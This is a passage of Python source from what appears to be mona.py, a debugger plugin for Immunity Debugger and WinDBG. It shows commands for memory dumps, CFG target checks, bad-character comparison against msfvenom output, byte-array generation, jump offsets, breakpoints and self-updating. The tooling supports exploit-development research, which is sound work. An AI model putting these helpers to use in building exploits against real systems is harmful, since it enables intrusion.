					dbg.log("    Address is start of function '%s' in %s" % (eatlist[address],modname))
				else:
					iatlist = modinfo.getIAT()
					if address in iatlist:
						iatentry = iatlist[address]
						dbg.log("    Address is part of IAT, and contains pointer to '%s'" % iatentry)		

				# if the module is CFG, check if this address would be a viable target
				if modinfo.isCFG:
					cfg_compat, reason = modinfo.checkCFGCompatible(address, return_reason=True)
					if cfg_compat:
						dbg.log("")
						dbg.log("    Address %s would likely be a valid CFG Target" % PTR_PRINT % address)
					else:
						dbg.log("")
						dbg.log("    Address %s is not a valid CFG Target" % PTR_PRINT % address)
					reasonlines = reason.split('\n')
					for reasonline in reasonlines:
						dbg.log("    -> %s" % reasonline)
							
	else:
		output = ""
		if ptr.isInHeap():
			dbg.log("    This address resides in the heap")
			dbg.log("")
			ptr.showHeapBlockInfo()
		else:
			dbg.log("    Module: None")	

	if __DEBUGGERAPP__ == "WinDBG":
		funcinfo = dbglib.Function(dbg,address)
		symname = funcinfo.addressToSymbol()
		if symname != "":
			dbg.log("")
			dbg.log("[+] Function found at 0x%08x, Symbol name: %s" % (address, clickDisassemble(symname)))

	try:
		dbg.log("")
		dbg.log("[+] Disassembly:")
		op = dbg.disasm(address)
		opstring=getDisasmInstruction(op)
		dbg.log("    Instruction at %s : %s" % (toHex(address),opstring))
	except:
		pass
	if __DEBUGGERAPP__ == "WinDBG":
		dbg.log("")
		dbg.log("Output of !address 0x%08x:" % address)
		output = dbg.nativeCommand("!address 0x%08x" % address)
		dbg.logLines(output)
	dbg.log("")

# ----- dump: Dump some memory to a file ----- #
def procDump(args):
	
	filename = ""
	if "f" not in args:
		dbg.log("Missing mandatory argument -f filename", highlight=1)
		return
	filename = args["f"]
	
	address = None
	if "s" not in args:
		dbg.log("Missing mandatory argument -s address", highlight=1)
		return
	startaddress_raw = str(args["s"]).replace("0x","").replace("0X","")
	startaddress, startaddressok = getAddyArg(startaddress_raw)
	if not startaddressok:
		dbg.log("You have specified an invalid start address", highlight=1)
		return
	address = startaddress
	
	size = 0
	if "n" in args:
		size = int(args["n"])
	elif "e" in args:
		endaddress_raw = str(args["e"]).replace("0x","").replace("0X","")
		endaddress, endaddressok = getAddyArg(endaddress_raw)
		if not endaddressok:
			dbg.log("You have specified an invalid end address", highlight=1)
			return
		end = endaddress
		if end < address:
			dbg.log("End address %s is before start address %s, going to flip them around" % (args["e"],args["s"]))
			taddress = end
			end = address
			address = taddress
		size = end - address
	else:
		dbg.log("you need to specify either the size of the copy with -n or the end address with -e ", highlight=1)
		return
	
	dumpMemoryToFile(address,size,filename)

# ----- compare : Compare a file created by msfvenom/gdb/hex/xxd/hexdump/ollydbg or just a file with raw bytes with a copy in memory, indicate bad chars / corruption ----- #
def procCompare(args):
	startpos = 0
	filename = ""
	skipmodules = False
	findunicode = False
	allregs = getRegisters()
	if "f" in args:
		filename = getAbsolutePath(args["f"].replace('"',"").replace("'",""))
		#see if we can read the file
		if not os.path.isfile(filename):
			dbg.log("Unable to find/read file %s" % filename,highlight=1)
			return
	else:
		dbg.log("You must specify a valid filename using parameter -f", highlight=1)
		return
	if "a" in args:
		startpos,addyok = getAddyArg(args["a"])
		if not addyok:
			dbg.log("%s is an invalid address" % args["a"], highlight=1)
			return
	if "s" in args:
		skipmodules = True
	if "unicode" in args:
		findunicode = True
	if "t" in args:
		format = args["t"]
	else:
		format = None
	compareFormattedFileWithMemory(filename,format,startpos,skipmodules,findunicode)				
	
# ----- offset: Calculate the offset between two addresses ----- #
def procOffset(args):
	extratext1 = ""
	extratext2 = ""
	isReg_a1 = False
	isReg_a2 = False
	regs = getRegisters()
	if "a1" not in args:
		dbg.log("Missing mandatory argument -a1 <address>", highlight=1)
		return
	a1 = args["a1"]
	if "a2" not in args:
		dbg.log("Missing mandatory argument -a2 <address>", highlight=1)
		return		
	a2 = args["a2"]

	a1,addyok = getAddyArg(args["a1"])
	if not addyok:			
		dbg.log("0x%08x is not a valid address" % a1, highlight=1)
		return

	a2,addyok = getAddyArg(args["a2"])
	if not addyok:			
		dbg.log("0x%08x is not a valid address" % a2, highlight=1)
		return

	diff = a2 - a1
	result=toHex(diff)
	negjmpbytes = b""
	if a1 > a2:
		ndiff = a1 - a2
		result=toHex(4294967296-ndiff)
		negjmpbytes="\\x"+ result[6]+result[7]+"\\x"+result[4]+result[5]+"\\x"+result[2]+result[3]+"\\x"+result[0]+result[1]
		regaction="sub"
	dbg.log("Offset from 0x%08x to 0x%08x : %d (0x%s) bytes" % (a1,a2,diff,result))	
	if a1 > a2:
		dbg.log("Negative jmp offset : %s" % negjmpbytes)
	#else:
	#	dbg.log("Jmp offset : %s" % negjmpbytes)		
	return		
		
# ----- bp: Set a breakpoint on read/write/exe access ----- #
def procBp(args):
	thistype = ""
	
	if "a" not in args:
		dbg.log("Missing mandatory argument -a address", highlight=1)
		dbg.log("The address can be an absolute address, a register, a module, a module!function, a symbol, or an expression with offsets")
		return
	a, addyok = getAddyArg(str(args["a"]))
	if not addyok:
		dbg.log("Please specify a valid address/register/module/module!function/symbol expression (-a)", highlight=1)
		return
		
	valid_types = ["READ", "WRITE", "EXE", "R", "W", "X"]
	bpflags = {}
	bpflags["EXE"] = ["S"]
	bpflags["READ"] = ["R"]
	bpflags["WRITE"] = ["W"]

	condition = ""
	extracmd = ""
	if "if" in args:
		if type(args["if"]).__name__.lower() != "bool":
			condition = args["if"]

	if "c" in args:
		if type(args["c"]).__name__.lower() != "bool":
			if __DEBUGGERAPP__ == "WinDBG":
				extracmd = args["c"]

	if "t" not in args:
		# No -t: set software breakpoint (INT 3)
		dbg.log("[*] Setting software breakpoint at 0x%s" % toHex(a))
		if condition:
			dbg.log("[*] Condition: %s" % condition)
		if extracmd:
			dbg.log("[*] Extra command on hit: %s" % extracmd)
		try:
			if __DEBUGGERAPP__ == "Immunity Debugger":
				dbg.setBreakpoint(a)
				if condition:
					hook = MnConditionalHook(condition)
					hook.add("mona_cond_%x" % a, a)
					dbg.setComment(a, "Cond: %s" % condition)
			else:
				if condition:
					dbg.setBreakpoint(a, condition, extracmd=extracmd)
				else:
					dbg.setBreakpoint(a, extracmd=extracmd)
			dbg.log("[+] Software breakpoint set at 0x%s" % toHex(a))
		except Exception as e:
			dbg.log("[!] Failed to set software breakpoint: %s" % str(e), highlight=1)
		return

	thistype = args["t"].upper()
		
	if not thistype in valid_types:
		dbg.log("Invalid type : %s" % thistype)
		dbg.log("Valid types are: %s" % ", ".join(valid_types))
		return
	
	if thistype == "R":
		thistype = "READ"

	if thistype == "W":
		thistype = "WRITE"

	if thistype == "X" or thistype == "EXE":
		thistype = "EXE"

	bpflag = bpflags[thistype][0]
	
	if __DEBUGGERAPP__ == "Immunity Debugger":
		# Immunity setHardwareBreakpoint(address, type, size)
		# From immlib: HB_CODE=1 (Execute), HB_ACCESS=2 (R/W), HB_WRITE=3 (Write)
		# Execute must use size 1. Read/Write use size 4 if aligned, else 2 if aligned, else 1.
		imm_hwtypes = {"S": dbglib.HB_CODE, "R": dbglib.HB_ACCESS, "W": dbglib.HB_WRITE}
		# setMemBreakpoint(address, size, type) fallback flags: "r" = access (R+W+X), "w" = write
		imm_membpflags = {"S": "r", "R": "r", "W": "w"}
		if bpflag == "S":
			hwsize = 1
		elif a % 4 == 0:
			hwsize = 4
		elif a % 2 == 0:
			hwsize = 2
		else:
			hwsize = 1
		type_desc = {"S": "Execute (HB_CODE)", "R": "Access (HB_ACCESS, catches R+W+X)", "W": "Write (HB_WRITE)"}
		dbg.log("[*] Setting hardware breakpoint at 0x%s, type: %s, size: %d" % (toHex(a), type_desc[bpflag], hwsize))
		if condition:
			dbg.log("[*] Condition: %s" % condition)
		try:
			result = dbg.setHardwareBreakpoint(a, imm_hwtypes[bpflag], hwsize)
			if result == -1:
				dbg.log("[!] Hardware breakpoint failed (DR0-DR3 may be full).", highlight=1)
			elif condition:
				hook = MnConditionalHook(condition)
				hook.add("mona_cond_%x" % a, a)
				dbg.setComment(a, "Cond: %s" % condition)
		except Exception as e:
			dbg.log("[!] setHardwareBreakpoint exception: %s" % str(e), highlight=1)
			return
	else:
		# WinDBG: setMemBreakpoint uses 'ba' (break on access) = hardware breakpoints
		type_desc = {"S": "Execute (ba e)", "R": "Access/Read (ba r)", "W": "Write (ba w)"}
		dbg.log("[*] Setting hardware breakpoint at 0x%s, type: %s" % (toHex(a), type_desc[bpflag]))
		if condition:
			dbg.log("[*] Condition: %s" % condition)
		if extracmd:
			dbg.log("[*] Extra command on hit: %s" % extracmd)
		dbg.setMemBreakpoint(a, bpflag, condition, extracmd=extracmd)
		dbg.log("[+] Hardware breakpoint set on %s of 0x%s" % (thistype, toHex(a)))


	
# ----- bu: set a deferred breakpoint ---- #
def procBu(args):
	if not "a" in args:
		dbg.log("No targets defined. (-a)",highlight=1)
		return
	else:
		allargs = args["a"]
		bpargs = allargs.split(",")
		breakpoints = {}
		dbg.log("")
		dbg.log("Received %d addresses//functions to process" % len(bpargs))
		# set a breakpoint right away for addresses and functions that are mapped already
		for tbparg in bpargs:
			bparg = tbparg.replace(" ","")
			# address or module.function ?
			if bparg.find(".") > -1:
				functionaddress = dbg.getAddress(bparg)
				if functionaddress > 0:
					# module.function is already mapped, we can set a bp right away
					dbg.setBreakpoint(functionaddress)
					breakpoints[bparg] = True
					dbg.log("Breakpoint set at 0x%08x (%s), was already mapped" % (functionaddress,bparg), highlight=1)
				else:
					breakpoints[bparg] = False # no breakpoint set yet
			elif bparg.find("+") > -1:
				ptrparts = bparg.split("+")
				modname = ptrparts[0]
				if not modname.lower().endswith(".dll"):
					modname += ".dll" 
				themodule = getModuleObj(modname)												
				if themodule != None and len(ptrparts) > 1:
					address = themodule.getBase() + int(ptrparts[1],16)
					if address > 0:
						dbg.log("Breakpoint set at %s (0x%08x), was already mapped" % (bparg,address),highlight=1)
						dbg.setBreakpoint(address)
						breakpoints[bparg] = True
					else:
						breakpoints[bparg] = False
				else:
					breakpoints[bparg] = False
			if bparg.find(".") == -1 and bparg.find("+") == -1:
				# address, see if it is mapped, by reading one byte from that location
				address = -1
				try:
					address = int(bparg,16)
				except:
					pass
				thispage = dbg.getMemoryPageByAddress(address)
				if thispage != None:
					dbg.setBreakpoint(address)
					dbg.log("Breakpoint set at 0x%08x, was already mapped" % address, highlight=1)
					breakpoints[bparg] = True
				else:
					breakpoints[bparg] = False

		# get the correct addresses to put hook on
		loadlibraryA = dbg.getAddress("kernel32.LoadLibraryA")
		loadlibraryW = dbg.getAddress("kernel32.LoadLibraryW")

		if loadlibraryA > 0 and loadlibraryW > 0:
		
			# find end of function for each
			endAfound = False
			endWfound = False
			cnt = 1
			while not endAfound:
				objInstr = dbg.disasmForward(loadlibraryA, cnt)
				strInstr = getDisasmInstruction(objInstr)
				if strInstr.startswith("retn"):
					endAfound = True
					loadlibraryA = objInstr.getAddress()
				cnt += 1
			
			cnt = 1
			while not endWfound:
				objInstr = dbg.disasmForward(loadlibraryW, cnt)
				strInstr = getDisasmInstruction(objInstr)
				if strInstr.startswith("retn"):
					endWfound = True
					loadlibraryW = objInstr.getAddress()
				cnt += 1	
			
			# if addresses/functions are left, throw them into their own hooks,
			# one for each LoadLibrary type.
			hooksplaced = False
			for bptarget in breakpoints:
				if not breakpoints[bptarget]:
					myhookA = MnDeferredHook(loadlibraryA, bptarget)
					myhookA.add("HOOK_A_%s" % bptarget, loadlibraryA)
					myhookW = MnDeferredHook(loadlibraryW, bptarget)
					myhookW.add("HOOK_W_%s" % bptarget, loadlibraryW)
					dbg.log("Hooks for %s installed" % bptarget)
					hooksplaced = True
			if not hooksplaced:
				dbg.log("No hooks placed")
		else:
			dbg.log("** Unable to place hooks, make sure kernel32.dll is loaded",highlight=1)
		return "Done"							
	
# ----- bf: Set a breakpoint on exported functions of a module ----- #
def procBf(args):

	dbgp(get_current_function_name())

	funcfilter = ""
	
	mode = ""
	
	func_type = "export"

	extracmd = ""
	
	modes = ["add","del","list"]
	types = ["import","export","iat","eat"]
	
	modulecriteria={}
	criteria={}
	
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)

	if "s" in args:
		try:
			funcfilter = args["s"].lower()
		except:
			dbg.log("No functions selected. (-s)",highlight=1)
			return
	else:
		dbg.log("No functions selected. (-s)",highlight=1)
		return

	if "c" in args:
		if type(args["c"]).__name__.lower() != "bool":
			if __DEBUGGERAPP__ == "WinDBG":
				extracmd = args["c"]

	if "t" in args:
		try:
			mode = args["t"].lower()
		except:
			pass

	if "f" in args:
		try:
			func_type = args["f"].lower()
		except:
			pass

	if not func_type in types:
		dbg.log("No valid function type selected (-f <import|export>)",highlight=1)
		return

	if not mode in modes or mode=="":
		dbg.log("No valid action defined. (-t add|del|list)")

	doManageBpOnFunc(modulecriteria,criteria,funcfilter,mode,func_type,extracmd)
	
	return


	
# ----- Print byte array ----- #

def procByteArray(args):

	dbgp(get_current_function_name())

	badchars = ""
	bytesperline = 32
	startval = 0
	endval = 255

	# kept for legacy
	if "r" in args:
		startval = 255
		endval = 0

	# handle start argument
	if "s" in args:
			startval = hex2int(cleanHex(args['s']))
	# handle end argument
	if "e" in args:
			endval = hex2int(cleanHex(args['e']))

	if "b" in args:
		dbg.log(" *** Note: parameter -b has been deprecated and replaced with -cpb ***")
		if type(args["b"]).__name__.lower() != "bool":
			if not "cpb" in args:
				args["cpb"] = args["b"]

	if "cpb" in args:	
		badchars = args["cpb"]
	badchars = cleanHex(badchars)

	# see if we need to expand ..
	bpos = 0
	newbadchars = ""
	while bpos < len(badchars):
		curchar = badchars[bpos]+badchars[bpos+1]
		if curchar == "..":
			pos = bpos
			if pos > 1 and pos <= len(badchars)-4:
				# get byte before and after ..
				bytebefore = badchars[pos-2] + badchars[pos-1]
				byteafter = badchars[pos+2] + badchars[pos+3]
				bbefore = int(bytebefore,16)
				bafter = int(byteafter,16)
				insertbytes = b""
				bbefore += 1
				while bbefore < bafter:
					insertbytes += "%02x" % bbefore
					bbefore += 1
				newbadchars += insertbytes
		else:
			newbadchars += curchar
		bpos += 2
	badchars = newbadchars

	cnt = 0
	strb = b""
	while cnt < len(badchars):
		strb += binascii.a2b_hex(badchars[cnt]+badchars[cnt+1])
		cnt=cnt+2

	dbg.log("Generating table, excluding %d bad chars..." % len(strb))
	arraytable = []
	binarray = b""

	# handle range() last value
	if endval > startval:
		increment = 1
		endval += 1
	else:
		endval += -1
		increment = -1

	# create bytearray
	for thisval in range(startval,endval,increment):
		hexbyte = hex(thisval)[2:]
		binbyte = hex2bin(toHexByte(thisval))
		if len(hexbyte) == 1:
			hexbyte = "0" + hexbyte
		hexbyte2 = binascii.a2b_hex(hexbyte)
		if not hexbyte2 in strb:
			arraytable.append(hexbyte)
			binarray += binbyte

	dbg.log("Dumping table to file")
	totalbytes = len(arraytable)
	tablecnt = 0
	rawoutputlines = []
	pythonoutputlines = ["byte_array = b\"\""]
	while tablecnt < totalbytes:
		cnt = 0
		thisline = ""
		while tablecnt < totalbytes and cnt < bytesperline:
			thisline += "\\x" + arraytable[tablecnt]
			tablecnt += 1
			cnt += 1
		rawoutputlines.append("\"%s\"" % thisline)
		pythonoutputlines.append("byte_array += b\"%s\"" % thisline)

	if totalbytes == 0:
		rawoutputlines.append("\"\"")
		pythonoutputlines.append("bytearray += b\"\"")

	output = "\n".join(rawoutputlines) + "\n"
	outputpy = "\n".join(pythonoutputlines) + "\n"
	outputcombined = output + "\n# Python 2/3 compatible format\n" + outputpy
	
	arrayfilename="bytearray.txt"
	objarrayfile = MnLog(arrayfilename)
	arrayfile = objarrayfile.reset(skipModuleTable=True)
	binfilename = arrayfile.replace("bytearray.txt","bytearray.bin")
	objarrayfile.write(outputcombined,arrayfile)
	dbg.logLines(output)
	dbg.log("Python 2/3 bytearray code added to %s" % arrayfile)
	dbg.log("")
	binfile = open(binfilename,"wb")
	binfile.write(binarray)
	binfile.close()
	dbg.log("Done, wrote %d bytes to file %s" % (len(arraytable),arrayfile))
	dbg.log("Binary output saved in %s" % binfilename)
	return
	
	
	
	
#----- Read binary file, print 'nice' header -----#
def procPrintHeader(args):
	alltypes = ["ruby","rb","python","py"]
	# Default to Python output (works in both Python2 and Python3)
	thistype = "python"
	filename = ""
	typewrong = False
	stopnow = False
	if "f" in args:
		if type(args["f"]).__name__.lower() != "bool":	
			filename = getAbsolutePath(args["f"])
	if "t" in args:
		if type(args["t"]).__name__.lower() != "bool":
			if args["t"] in alltypes:
				thistype = args["t"]
			else:
				typewrong = True
		else:
			typewrong = True

	if typewrong:
		dbg.log("Invalid type specified with option -t. Valid types are: %s" % alltypes,highlight=1)
		stopnow = True
	else:
		if thistype == "rb":
			thistype = "ruby"
		if thistype == "py":
			thistype = "python"

	if filename == "":
		dbg.log("Missing argument -f <source filename>",highlight=1)
		stopnow = True

	if stopnow:
		return

	filename = filename.replace("'","").replace('"',"")

	if not os.path.isfile(filename):
		dbg.log("Unable to read file %s" % filename,highlight=1)
		return

	content_bytes = fileToBin(filename)
	if len(content_bytes) == 0:
		try:
			if os.path.getsize(filename) > 0:
				dbg.log("Unable to read file %s" % filename,highlight=1)
				return
		except:
			dbg.log("Unable to read file %s" % filename,highlight=1)
			return

	# Existing logic below expects a text string with byte-for-byte mapping.
	content = ''.join(chr(b) for b in content_bytes)

	dbg.log("Read %d bytes from %s" % (len(content_bytes),filename))	
	dbg.log("Output type: %s" % thistype)
	cnt = 0
	linecnt = 0	
	
	output = ""
	thisline = ""			
	
	max = len(content)
	
	addchar = "<<"
	if thistype == "python":
		addchar = "+="
	
	# keep it easy, initialize header as an empty string/bytes
	litprefix = "\""
	if thistype == "python":
		litprefix = "b\""
		output = "header = b\"\"\n"
	else:
		output = "header = \"\"\n"

	while cnt < max:

		# first check for unicode
		if cnt < max-1:
			
			thisline = "header %s %s" % (addchar, litprefix)	
			thiscnt = cnt
			while cnt < max-1 and isAscii2(_ord(content[cnt])) and _ord(content[cnt+1]) == 0:
				if content[cnt] == "\\":
					thisline += "\\"
				if content[cnt] == "\"":
					thisline += "\\"
				thisline += "%s\\x00" % content[cnt]
				cnt += 2
			if thiscnt != cnt:
				output += thisline + "\"" + "\n"
				linecnt += 1
				
		thisline = "header %s %s" % (addchar, litprefix)
		thiscnt = cnt
		
		# ascii repetitions
		reps = 1
		startval = content[cnt]
		if isAscii(_ord(content[cnt])):
			while cnt < max-1:
				if startval == content[cnt+1]:
					reps += 1
					cnt += 1	
				else:
					break
			if reps > 1:
				# Avoid emitting literal newlines/CR in generated code
				if startval == "\n":
					startval = "\\n"
				elif startval == "\r":
					startval = "\\r"
				if startval == "\\":
					startval += "\\"
				if startval == "\"":
					startval = "\\" + "\""	
				output += thisline + startval + "\" * " + str(reps) + "\n"
				cnt += 1
				linecnt += 1
				continue
				

		thisline = "header %s %s" % (addchar, litprefix)
		thiscnt = cnt
		
		# check for just ascii
		while cnt < max and isAscii2(_ord(content[cnt])):
			if cnt < max-1 and _ord(content[cnt+1]) == 0:
				break
			if content[cnt] == "\\":
				thisline += "\\"
			if content[cnt] == "\"":
				thisline += "\\"			
			thisline += content[cnt]
			cnt += 1
			
			
		if thiscnt != cnt:
			output += thisline + "\"" + "\n"
			linecnt += 1		
		
		#check others : repetitions
		if cnt < max:
			thisline = "header %s %s" % (addchar, litprefix)
			thiscnt = cnt
			while cnt < max:
				if isAscii2(_ord(content[cnt])):
					break
				if cnt < max-1 and isAscii2(_ord(content[cnt])) and _ord(content[cnt+1]) == 0:
					break
				#check repetitions
				reps = 1
				startval = _ord(content[cnt])
				while cnt < max-1:
					if startval == _ord(content[cnt+1]):
						reps += 1
						cnt += 1	
					else:
						break
				if reps > 1:
					if len(thisline) > 12:
						output += thisline + "\"" + "\n"
					thisline = "header %s %s\\x" % (addchar, litprefix)
					thisline += "%02x\" * %d" % (startval,reps)
					output += thisline + "\n"
					thisline = "header %s %s" % (addchar, litprefix)
					linecnt += 1
				else:
					thisline += "\\x" + "%02x" % _ord(content[cnt])	
				cnt += 1
			if thiscnt != cnt:
				if len(thisline) > 12:
					output += thisline + "\"" + "\n"
					linecnt += 1			

	headerfilename="header.txt"
	objheaderfile = MnLog(headerfilename)
	headerfile = objheaderfile.reset(skipModuleTable=True)
	objheaderfile.write(output,headerfile)
	if not silent:
		dbg.log("-" * 30)
		dbg.logLines(output)
		dbg.log("-" * 30)			
	dbg.log("Wrote header to %s" % headerfile)
	return

#----- Update -----#

def procUpdate(args):
	"""
	Function to update mona.py and optionally windbglib.py to the latest version.
	Also downloads mona_releasenotes.txt and prints the section that matches the new version/revision.

	Behavior:
	- WinDBG  : update mona.py + windbglib.py
	- Immunity: update mona.py only
	- In both cases, try to download mona_releasenotes.txt

	If "simul" is present in args, then do a simulation only:
	- detect whether newer versions exist
	- print release notes
	- do NOT overwrite existing .py files

	If "force" is present in args, then:
	- still validate downloaded files contain version/revision info
	- overwrite local file(s) even if the version is not newer
	- show release notes for the downloaded version/revision (if available)

	In simulation mode:
	- if a newer version is found, show release notes for that newer version
	- if no newer version is found (or download failed), show release notes for the current version
	"""

	dbgp(get_current_function_name())

	def _normalize_version(v):
		if v is None:
			return ""
		v = str(v).strip().replace("'", "").replace('"', "")
		return v

	def _normalize_name_for_notes(filename):
		base = os.path.basename(str(filename)).lower().strip()
		if base.endswith(".py"):
			base = base[:-3]
		if base.endswith(".txt"):
			base = base[:-4]
		return base

	def _version_tuple(v):
		v = _normalize_version(v)
		if v == "":
			return ()
		parts = []
		for p in v.split("."):
			try:
				parts.append(int(p))
			except:
				parts.append(0)
		return tuple(parts)

	def _is_newer(cur_ver, cur_rev, new_ver, new_rev):
		cur_vt = _version_tuple(cur_ver)
		new_vt = _version_tuple(new_ver)
		cur_r = _safe_int(cur_rev)
		new_r = _safe_int(new_rev)

		dbgp("Comparing versions: current=%s.%s new=%s.%s" % (str(cur_ver), str(cur_rev), str(new_ver), str(new_rev)))

		if new_vt > cur_vt:
			return True
		if new_vt < cur_vt:
			return False
		return new_r > cur_r

	def _safe_remove(filename):
		try:
			if filename and os.path.exists(filename):
				os.remove(filename)
				dbgp("Removed temporary file %s" % filename)
		except Exception as e:
			dbgp("Unable to remove temporary file %s : %s" % (filename, str(e)), errormode=False)

	def _check_connectivity():
		hostnames = [
			("github.com", 443),
			("www.corelan.be", 443)
		]

		for host, port in hostnames:
			try:
				dbgp("Checking connectivity to %s:%d" % (host, port))
				s = socket.create_connection((host, port), 5)
				s.close()
				dbgp("Connectivity check succeeded for %s:%d" % (host, port))
				return True
			except Exception as e:
				dbgp("Connectivity check failed for %s:%d : %s" % (host, port, str(e)), errormode=False)

		return False

	def _locate_windbglib():
		candidates = []
		try:
			thisdir = os.path.dirname(os.path.abspath(inspect.stack()[0][1]))
			candidates.append(os.path.join(thisdir, "windbglib.py"))
		except:
			pass

		try:
			import windbglib
			if hasattr(windbglib, "__file__"):
				candidates.append(os.path.abspath(windbglib.__file__.replace(".pyc", ".py")))
		except:
			pass

		for candidate in candidates:
			if os.path.isfile(candidate):
				dbgp("Located windbglib.py at %s" % candidate)
				return candidate

		return ""

	def _validate_versioned_python_file(filename):
		version, revision = getVersionInfo(filename)
		if version == "" and revision == "0":
			return False, "no version/revision information found"
		return True, ""

	def _download_with_fallback(main_url, backup_url, destfile, label, validator=None):
		last_error = ""
		for urltype, url in [("main", main_url), ("backup", backup_url)]:
			try:
				dbgp("[+] Downloading %s from %s URL" % (label, urltype))
				dbgp("Downloading %s from %s" % (label, url))
				tmp = urllib_urlretrieve(url)
				srcfile = tmp[0]
				dbgp("Temporary downloaded file for %s is %s" % (label, srcfile))
				shutil.copyfile(srcfile, destfile)
				dbgp("Saved %s to %s" % (label, destfile))

				if validator is not None:
					is_valid, validation_msg = validator(destfile)
					if is_valid:
						dbgp("%s downloaded from %s URL passed validation" % (label, urltype))
						return True, url
					last_error = validation_msg
					dbgp("%s downloaded from %s URL failed validation: %s" % (label, urltype, validation_msg))
					_safe_remove(destfile)
					continue

				return True, url
			except Exception as e:
				last_error = str(e)
				dbgp("Download failed for %s from %s : %s" % (label, url, str(e)), errormode=False)
				_safe_remove(destfile)

		if last_error != "":
			dbgp("All download attempts failed for %s. Last error: %s" % (label, last_error))
		return False, ""

	def _get_release_notes_for_version(releasenotes_file, filename, version, revision):
		normalized_name = _normalize_name_for_notes(filename)
		normalized_version = _normalize_version(version)
		normalized_revision = str(_safe_int(revision))
		header_to_find = "[%s %s.%s]" % (normalized_name, normalized_version, normalized_revision)

		dbgp("Looking for release notes header %s in %s" % (header_to_find, releasenotes_file))

		if not os.path.isfile(releasenotes_file):
			dbgp("Release notes file %s does not exist" % releasenotes_file)
			return header_to_find, ""

		try:
			with open(releasenotes_file, "rb") as fh:
				lines = fh.readlines()
		except Exception as e:
			dbgp("Unable to read release notes file %s : %s" % (releasenotes_file, str(e)), errormode=False)
			return header_to_find, ""

		found = False
		out = []

		for rawline in lines:
			try:
				line = rawline.decode("utf-8", "ignore")
			except:
				line = str(rawline)

			stripped = line.strip()

			if stripped.lower() == header_to_find.lower():
				found = True
				dbgp("Found matching release notes header %s" % header_to_find)
				continue

			if found:
				if stripped.startswith("[") and stripped.endswith("]"):
					break
				out.append(line.rstrip("\r\n"))

		return header_to_find, "\n".join(out).strip()

	def _get_release_notes_with_retry(releasenotes_file, releasenotes_backup, filename, version, revision):
		header, notes = _get_release_notes_for_version(releasenotes_file, filename, version, revision)
		if notes != "":
			return header, notes

		dbgp("Header %s not found in current release notes file, retrying from backup URL" % header)

		ok_notes, notes_url = _download_with_fallback(
			releasenotes_backup,
			releasenotes_backup,
			releasenotes_file,
			"mona_releasenotes.txt"
		)

		if ok_notes:
			dbgp("Re-downloaded release notes from backup URL %s" % notes_url)
			header, notes = _get_release_notes_for_version(releasenotes_file, filename, version, revision)
		else:
			dbgp("Unable to re-download release notes from backup URL")

		return header, notes

	simulate_only = False
	if "simul" in args:
		try:
			simulate_only = str_to_bool(args["simul"])
		except:
			simulate_only = True

	force_update = False
	if "force" in args:
		try:
			force_update = str_to_bool(args["force"])
		except:
			force_update = True

	if simulate_only:
		dbg.log("[+] Simulation mode enabled", highlight=1)
	if force_update and not simulate_only:
		dbg.log("[+] Force update enabled", highlight=1)

	if not _check_connectivity():
		dbg.log("[-] No internet connectivity detected. Update aborted.", highlight=1)
		return "Done"

	mona_path = os.path.abspath(inspect.stack()[0][1])
	mona_dir = os.path.dirname(mona_path)

	dbgp("Resolved mona.py path to %s" % mona_path)
	dbgp("Resolved mona.py directory to %s" % mona_dir)

	dbgp("Current mona.py path : %s" % mona_path)

	files_to_process = [
		{
			"name": "mona.py",
			"current": mona_path,
			"download": mona_path + ".download",
			"main_url": "https://github.com/corelan/mona3/raw/master/mona.py",
			"backup_url": "https://www.corelan.be/mona3/mona.py"
		}
	]

	if __DEBUGGERAPP__ == "WinDBG":
		windbg_path = _locate_windbglib()
		if windbg_path == "":
			dbgp("[!] Unable to locate windbglib.py. Will update mona.py only.")
		else:
			dbgp("[+] Current windbglib.py path : %s" % windbg_path)
			files_to_process.append(
				{
					"name": "windbglib.py",
					"current": windbg_path,
					"download": windbg_path + ".download",
					"main_url": "https://github.com/corelan/mona3/raw/master/windbglib.py",
					"backup_url": "https://www.corelan.be/mona3/windbglib.py"
				}
			)
	else:
		dbgp("Debugger app is not WinDBG, so only mona.py will be processed")

	releasenotes_path = os.path.abspath(os.path.join(mona_dir, "mona_releasenotes.txt"))
	releasenotes_main = "https://github.com/corelan/mona3/raw/master/mona_releasenotes.txt"
	releasenotes_backup = "https://www.corelan.be/mona3/mona_releasenotes.txt"

	dbgp("Release notes will be stored at %s" % releasenotes_path)

	downloaded_release_notes = False
	ok_notes, notes_url = _download_with_fallback(
		releasenotes_main,
		releasenotes_backup,
		releasenotes_path,
		"mona_releasenotes.txt"
	)
	if ok_notes:
		downloaded_release_notes = True
		dbgp("Release notes downloaded successfully from %s" % notes_url)
	else:
		dbgp("Release notes could not be downloaded from main or backup URL")

	release_notes_targets = []
	seen_release_headers = {}

	for entry in files_to_process:
		name = entry["name"]
		current_file = entry["current"]
		download_file = entry["download"]
		main_url = entry["main_url"]
		backup_url = entry["backup_url"]

		dbg.log("[+] Processing %s" % name)
		dbgp("Current file   : %s" % current_file)
		dbgp("Download target: %s" % download_file)

		if not os.path.isfile(current_file):
			dbgp("    [!] Current file not found: %s" % current_file)
			dbgp("Skipping %s because current file does not exist" % name)
			continue

		current_version, current_revision = getVersionInfo(current_file)

		dbgp("Current version info for %s: version=%s revision=%s" % (name, current_version, current_revision))

		if current_version == "" and current_revision == "0":
			if not force_update:
				dbgp("    [!] Unable to read current version info from %s" % current_file)
				dbgp("Skipping %s because current version info could not be read" % name)
				continue
			dbg.log("    [!] Unable to read current version info from %s (continuing due to -force)" % current_file, highlight=1)

		ok_download, used_url = _download_with_fallback(
			main_url,
			backup_url,
			download_file,
			name,
			validator=_validate_versioned_python_file
		)
		if not ok_download:
			dbg.log("    [-] Unable to download %s from main or backup URL" % name, highlight=1)
			dbgp("Skipping %s because download failed or returned invalid content" % name)

			if simulate_only:
				dbgp("Simulation mode: using current version release notes for %s because download failed" % name)
				release_notes_targets.append((name, current_version, current_revision))

			_safe_remove(download_file)
			continue

		new_version, new_revision = getVersionInfo(download_file)

		dbgp("Downloaded version info for %s: version=%s revision=%s" % (name, new_version, new_revision))

		if new_version == "" and new_revision == "0":
			dbg.log("    [-] Downloaded %s but could not read version/revision information" % name, highlight=1)
			dbgp("Downloaded file for %s does not appear to contain valid version info" % name)

			if simulate_only:
				dbgp("Simulation mode: using current version release notes for %s because downloaded file had invalid version info" % name)
				release_notes_targets.append((name, current_version, current_revision))
				dbgp("Not removing downloaded file so you can inspect what went wrong")
			else:
				_safe_remove(download_file)
			continue

		dbg.log("    Current : version %s / revision %s" % (current_version, current_revision))
